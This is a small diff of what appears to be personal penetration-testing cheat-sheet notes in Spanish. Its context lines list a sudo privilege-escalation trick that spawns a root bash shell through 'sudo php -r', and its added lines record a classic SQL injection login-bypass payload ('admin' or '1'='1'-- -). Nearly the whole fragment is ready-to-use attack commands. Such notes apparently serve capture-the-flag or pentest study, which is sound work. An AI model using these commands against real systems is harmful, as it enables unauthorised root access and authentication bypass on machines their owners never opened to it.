@@ -25,3 +25,6 @@ sudo -l |info
 --Si: /usr/bin/php
 sudo /usr/bin/php -a
 sudo php -r "system('/bin/bash');”  |este si
+
+--Inyección básica
+admin' or '1'='1'-- -
